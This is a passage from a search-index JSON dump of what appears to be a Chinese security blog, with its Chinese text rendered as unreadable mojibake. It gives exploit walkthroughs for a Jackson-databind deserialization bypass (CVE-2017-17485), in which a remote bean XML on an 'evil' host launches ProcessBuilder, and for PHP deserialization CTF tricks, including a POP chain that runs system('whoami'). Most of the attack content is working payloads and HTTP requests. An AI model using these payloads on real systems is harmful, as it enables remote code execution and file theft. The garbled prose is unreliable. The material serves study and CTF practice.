} ] } è¿™ä¸ªPOCåªèƒ½è¿è¡Œåœ¨ç›®æ ‡ä¸ºJDK7u21ä»¥ä¸‹çš„ç¯å¢ƒä¸­ï¼Œå…¶ä»–æƒ…å†µéœ€è¦æ›´æ¢Gadgetã€‚ ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:1:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2017-17485 CVE-2017-7525é»‘åå•ä¿®å¤ç»•è¿‡ï¼Œåˆ©ç”¨äº†org.springframework.context.support.FileSystemXmlApplicationContextï¼Œåˆ©ç”¨è¯¥æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªbeanæ–‡ä»¶ï¼Œæ”¾ç½®åœ¨ä»»æ„æœåŠ¡å™¨ä¸Šï¼Œå¦‚http://evil/spel.xmlï¼Œå†…å®¹å¦‚ä¸‹ï¼š \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd \"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\"\u003e \u003cconstructor-arg\u003e \u003carray\u003e \u003cvalue\u003etouch\u003c/value\u003e \u003cvalue\u003e/tmp/prove2.txt\u003c/value\u003e \u003c/array\u003e \u003c/constructor-arg\u003e \u003cproperty name=\"any\" value=\"#{ pb.start() }\"/\u003e \u003c/bean\u003e \u003c/beans\u003e ç„¶åï¼Œå‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œä½¿JacksonåŠ è½½beanï¼Œè§¦å‘æ¼æ´ï¼š POST /exploit HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 138 { \"param\": [ \"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://IP/evil.xml\" ] } æˆåŠŸæ‰§è¡Œtouch /tmp/prove2.txtï¼š åŸç†ï¼š åˆ©ç”¨FileSystemXmlApplicationContextåŠ è½½è¿œç¨‹ bean å®šä¹‰æ–‡ä»¶ï¼Œåˆ›å»º ProcessBuilder beanï¼Œå¹¶åœ¨ xml æ–‡ä»¶ä¸­ä½¿ç”¨ Spring EL æ¥è°ƒç”¨start()æ–¹æ³•å®ç°å‘½ä»¤æ‰§è¡Œ ","date":"2019-02-21","objectID":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/:2:0","tags":["Jackson-databind","æ¼æ´å¤ç°"],"title":"Jackson-databind ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-7525ï¼‰","uri":"/2019/02/jackson-databind-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2017-7525/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"CTF ä¸­çš„ååºåˆ—åŒ–æ¼æ´ç›¸å…³","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"ååºåˆ—åŒ–ç³»åˆ— ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1 å®šä¹‰ä¸åŸç† ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1.1 ç›¸å…³æ¦‚å¿µ å†…å­˜æ•°æ®æ˜¯â€œç¨çºµå³é€â€çš„ï¼›é€šå¸¸ï¼Œç¨‹åºæ‰§è¡Œç»“æŸï¼Œç«‹å³å…¨éƒ¨é”€æ¯ã€‚å˜é‡æ‰€å­˜å‚¨çš„æ•°æ®ï¼Œå°±æ˜¯å†…å­˜æ•°æ®ï¼›æ–‡ä»¶æ˜¯â€œæŒä¹…æ•°æ®â€ åºåˆ—åŒ–ï¼šå°±æ˜¯å°†å†…å­˜çš„å˜é‡æ•°æ®ï¼Œâ€œä¿å­˜â€åˆ°æ–‡ä»¶ä¸­çš„æŒä¹…æ•°æ®çš„è¿‡ç¨‹ã€‚ç®€åŒ–å°±æ˜¯ï¼šå°†å†…å­˜å˜ä¸ºæ–‡ä»¶ ååºåˆ—åŒ–ï¼šå°±æ˜¯å°†åºåˆ—åŒ–è¿‡å­˜å‚¨åˆ°æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæ¢å¤åˆ°ç¨‹åºä»£ç çš„å˜é‡è¡¨ç¤ºå½¢å¼çš„è¿‡ç¨‹ã€‚ç®€åŒ–å°±æ˜¯ï¼šå°†æ–‡ä»¶å˜ä¸ºå†…å­˜ æ¼æ´çš„å½¢æˆçš„æ ¹æœ¬åŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥è¢«æ¶æ„æ§åˆ¶ï¼Œè¿›è€Œé€ æˆä»£ç æ‰§è¡Œã€getshell ç­‰ä¸€ç³»åˆ—ä¸å¯æ§çš„åæœã€‚ ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"1.2 ç›¸å…³å‡½æ•° serialize(mixed value) : string unserialize(string $str) : mixed 1.2.1 åºåˆ—åŒ– åºåˆ—åŒ–çš„å«ä¹‰ 1.2.2 ååºåˆ—åŒ– ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2 é­”æœ¯æ–¹æ³• - magic method __construct()ï¼šå½“ä¸€ä¸ªç±»è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ __destruct()ï¼šå½“ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ __invoke()ï¼šå½“æŠŠä¸€ä¸ªç±»å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨ __tostring()ï¼šå½“æŠŠä¸€ä¸ªç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup()ï¼šå½“è°ƒç”¨ unserialize() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ __sleep()ï¼šå½“è°ƒç”¨ serialize() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ __call()ï¼šå½“è¦è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æˆ–æƒé™ä¸è¶³æ—¶è‡ªåŠ¨è°ƒç”¨ ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2.1 æ³¨æ„ç‚¹ \\x00 + ç±»å + \\00 + å˜é‡å ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯ private å˜é‡ \\x00 + * + \\x00 + å˜é‡å ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯ protected å˜é‡ ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯ public å˜é‡ å¯¹è±¡å‰åŠ  + å¯ä»¥ç»•è¿‡æ­£åˆ™ ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"2.2 DEMO \u003c?php @error_reporting(1); class baby { public $file; function __toString() { if(isset($this-\u003efile)) { $filename = \"./{$this-\u003efile}\"; if (file_get_contents($filename)) { return file_get_contents($filename); } } } } if (isset($_GET['data'])) { $data = $_GET['data']; preg_match('/[oc]:\\d+:/i',$data,$matches); // è¿™é‡ŒåŒ¹é…åˆ° O åé¢è·Ÿç€æ•°å­—å°±æ‹¦æˆª if(count($matches)) { die('Hacker!'); } else { $good = unserialize($data); echo $good; } } else { highlight_file(\"./index.php\"); } ?\u003e Payloadï¼šurl?data=O:%2b4:\"baby\":1:{s:4:\"file\";s:8:\"flag.php\";} ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"3 PHP Bug 72663 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"3.1 åŸç† å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"3.2 DEMO \u003c?php class SoFun { protected $file = 'index.php'; function __destruct() { if (!empty($this-\u003efile)) { if (strchr($this-\u003efile, \"\\\\\") === false \u0026\u0026 strchr($this-\u003efile, '/') === false) show_source(dirname(__FILE__) . '/' . $this-\u003efile); else die('Wrong filename.'); } } function __wakeup() { $this-\u003efile = 'index.php'; } public function __toString() { return ''; } } if (!isset($_GET['file'])) { show_source('index.php'); } else { $file = base64_decode($_GET['file']); echo unserialize($file); } ?\u003e #\u003c!--key in flag.php--\u003e payloadï¼šurl?file=Tzo1OiJTb0Z1biI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9 ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:3:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"4 PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ– ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"4.1 ç›¸å…³åŸç† 4.1.1 PHP Session åºåˆ—åŒ–æœºåˆ¶ å½“ session_start() è¢«è°ƒç”¨æˆ–è€… php.ini ä¸­ session.auto_start ä¸º 1 æ—¶ï¼ŒPHP å†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œè®¿é—®ç”¨æˆ· session è¢«åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º /tmpï¼‰ã€‚ 4.1.2 session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨ PHP å†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å– $_SESSION æ•°æ®æ—¶ä¼šå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§ï¼Œå¯¹åº”ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ å¤„ç†å™¨ å¯¹åº”çš„å­˜å‚¨æ ¼å¼ php é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serialize (php\u003e=5.5.4) ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ 4.1.3 ä¸ session å­˜å‚¨ç›¸å…³çš„é…ç½®é¡¹ é…ç½®æ–‡ä»¶ php.ini ä¸­å«æœ‰è¿™å‡ ä¸ªä¸ session å­˜å‚¨ç›¸å…³çš„é…ç½®é¡¹ï¼š session.save_path = \"E:/wamp64/tmp\" -- è®¾ç½® session çš„å­˜å‚¨è·¯å¾„ï¼Œé»˜è®¤åœ¨ /tmp session.auto_start = 0 -- æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸º 0 ä¸å¯åŠ¨ session.serialize_handler = php -- å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨ php PHP æä¾›äº† session.serialize_handler é…ç½®é€‰é¡¹ï¼Œé€šè¿‡è¯¥é€‰é¡¹å¯ä»¥è®¾ç½®åºåˆ—åŒ–åŠååºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ï¼Œé»˜è®¤ä¸ºphpã€‚å¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç  ini_set('session.serialize_handler', 'éœ€è¦è®¾ç½®çš„å¼•æ“')ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š \u003c?php ini_set('session.serialize_handler', 'php'); session_start(); $SESSION['a'] = $_GET['a']; å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥ sess_sessionid æ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯ session å€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚å¯åœ¨ session.save_path å¯¹åº”è·¯å¾„ä¸‹çœ‹åˆ°ä¸€ä¸ªæ–°ç”Ÿæˆçš„ session æ–‡ä»¶ï¼Œè¿™é‡Œåä¸º sess_cj15cikdujk6uv3bdq6qvonbe7 ï¼Œå¯ä»¥çœ‹åˆ°å­˜å‚¨æ ¼å¼ä¸ºï¼šé”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ï¼ša|s3:\"123\"; ä½¿ç”¨ php_serialize å¤„ç†å™¨ï¼š \u003c?php ini_set('session.serialize_handler', 'php_serialize'); session_start(); $SESSION['a'] = $_GET['a']; æ ¼å¼ï¼šç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ï¼ša:1:{s:1:\"a\";s:3:\"123\";} ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"4.2 PHP session ååºåˆ—åŒ–æ¼æ´ å¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ã€‚ ç¤ºä¾‹ å½“å­˜å‚¨æ˜¯ php_serialize å¤„ç†ï¼Œç„¶åè°ƒç”¨æ—¶ä½¿ç”¨ php å¤„ç†å™¨å»å¤„ç†ï¼Œå¦‚æœè¿™æ—¶æ³¨å…¥çš„æ•°æ®æ˜¯ï¼ša=|O:4:\"test\":0{}ï¼Œé‚£ä¹ˆ session ä¸­çš„å†…å®¹æ˜¯ a:1:{s:1:\"a\";s:16:\"|O:4:\"test\":0:{}\";}ï¼Œæ ¹æ®è§£é‡Šï¼Œå…¶ä¸­ a:1:{s:1:\"a\";s:16:\" åœ¨ç»è¿‡ php è§£æåè¢«çœ‹ä½œæˆé”®åï¼Œåé¢å°±æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–çš„ test å¯¹è±¡çš„æ³¨å…¥ å½“é…ç½®é€‰é¡¹ session_auto_start=Off ï¼Œä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ","date":"2019-02-20","objectID":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:4:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","ååºåˆ—åŒ–æ¼æ´"],"title":"PHP ååºåˆ—åŒ–æ¼æ´ç›¸å…³","uri":"/2019/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•","CTF"],"content":"4.3 DEMO index.php \u003c?php show_source(__FILE__); ini_set('session.serialize_handler', 'php'); require('./class.php'); session_start(); $obj = new fool(); $obj-\u003evarr = \"phpinfo.php\"; class.php \u003c?php highlight_string(file_get_contents(basename($_SERVER['PHP_SELF']))); show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this-\u003evarr = \"i.php\"; } function __destruct(){ if(file_exists($this-\u003evarr)){ echo \"\u003cbr\u003eæ–‡ä»¶\".$this-\u003evarr.\"å­˜åœ¨\u003cbr\u003e\"; } echo \"\u003cbr\u003eè¿™æ˜¯foo1çš„ææ„å‡½æ•°\u003cbr\u003e\"; } } class foo2{ public $varr; public $obj; function __construct(){ $this-\u003evarr = '1234567890'; $this-\u003eobj = null; } function __toString(){ $this-\u003eobj-\u003eexecute(); return $this-\u003evarr; } function __desctuct(){ echo \"\u003cbr\u003eè¿™æ˜¯foo2çš„ææ„å‡½æ•°\u003cbr\u003e\"; } } class foo3{ public $varr; function execute(){ eval($this-\u003evarr); } function __desctuct(){ echo \"\u003cbr\u003eè¿™æ˜¯foo3çš„ææ„å‡½æ•°\u003cbr\u003e\"; } } ?\u003e phpinfo.php \u003c?php show_source(__FILE__); session_start(); require(\"./class.php\"); $f3 = new foo3(); $f3-\u003evarr = \"phpinfo();\"; $f3-\u003eexecute(); ? å¯ä»¥çœ‹åˆ°ï¼Œindex.php ä¸­ç”¨çš„æ˜¯ php å¤„ç†å™¨ã€‚ åœ¨ php.ini ä¸­çš„å…³é”®é…ç½®ï¼Œæ³¨æ„é…ç½®ä¸­çš„session.serialize_handlerï¼š session.serialize_handler=php_serialize session.upload_progress.cleanup=Off session.upload_progress.enabled=On å¯ä»¥è®¿é—® phpinfo.php æŸ¥çœ‹é…ç½®ä¿¡æ¯ï¼š é»˜è®¤æ˜¯é‡‡ç”¨ php å¤„ç†å™¨å¤„ç† sessionï¼Œsession.upload_progress.cleanup é…ç½®ä¸º Offï¼Œsession.upload_progress.enabled é…ç½®ä¸º Onã€‚ session.upload_progress.enabledï¼Œå½“å®ƒä¸ºå¼€å¯çŠ¶æ€æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ POST ä¸€ä¸ªä¸ php.iniä¸­è®¾ç½®çš„ session.upload_progress.name åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å°±å¯ä»¥åœ¨ $_SESSION ä¸­è·å¾—ã€‚å½“ PHP æ£€æµ‹åˆ°è¿™ç§ POST è¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨ $_SESSION ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefix ä¸ session.upload_progress.name è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ å½“å‰ä»£ç çš„è¯æ²¡æœ‰å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œä½†æ˜¯ç°åœ¨ session.upload_progress.enabled æ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¸Šä¼ æ–‡ä»¶ï¼Œä»è€Œåœ¨ session æ–‡ä»¶ä¸­å†™å…¥æ•°æ®ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ©ç”¨ç‚¹æ˜¯é€šè¿‡ session.upload_progress.enabled æ¥ä¸Šä¼ æ–‡ä»¶å‘ session æ–‡ä»¶ä¸­å†™å…¥ php_serialize å¤„ç†å™¨æ ¼å¼çš„å†…å®¹ï¼Œä»è€Œä¸ index.php ä¸­ php å¤„ç†å™¨ä¸åŒè¿›è€Œé€ æˆ session ååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨ã€‚ poc.phpï¼Œç”¨äºç”Ÿæˆåºåˆ—åŒ– pocï¼Œåœ¨ foo1 ä¸­çš„æ„é€ å‡½æ•°ä¸­å®šä¹‰ $varr çš„å€¼ä¸º foo2 çš„å®ä¾‹ï¼Œåœ¨ foo2 ä¸­å®šä¹‰ $obj ä¸º foo3 çš„å®ä¾‹ï¼Œåœ¨ foo3 ä¸­å®šä¹‰ $varr çš„å€¼ä¸º system(â€˜whoamiâ€™);ï¼š poc.php \u003c?php class foo3{ public $varr; function __construct(){ $this-\u003evarr = \"system('whoami');\"; } } class foo2{ public $varr; public $obj; function __construct(){ $this-\u003evarr = '1'; $this-\u003eobj = new foo3(); } } class foo1{ public $varr; function __construct(){ $this-\u003evarr = new foo2(); } } echo serialize(new foo1()); ?\u003e form.htmlï¼Œä¸€ä¸ªå‘ index.php æäº¤ POST è¯·æ±‚çš„è¡¨å•æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬ PHP_SESSION_UPLOAD_PROGRESS å˜é‡ï¼š \u003cform action=\"http://127.0.0.1/i.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"geekby\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e Burpsuite æˆªæ–­è¯¥ form.html å‘é€çš„ POST è¯·æ±‚ï¼Œåœ¨ PHP_SESSION_UPLOAD_PROGRESS ä¸€æ ä¸­çš„å€¼åŠ ä¸Š poc.php ç”Ÿæˆçš„ poc å°±èƒ½å¤ŸæˆåŠŸæ‰§è¡Œå‘½ä»¤äº†ï¼š |O:4:\"foo1\":1:{s:4:\"varr\";O:4:\"foo2\":2:{s:4:\"varr\";s:1:\"1\";s:3:\"obj\";O:4:\"foo3\":1:{s:4:\"varr\";s:19:\"system(\"whoami\");\";}}} 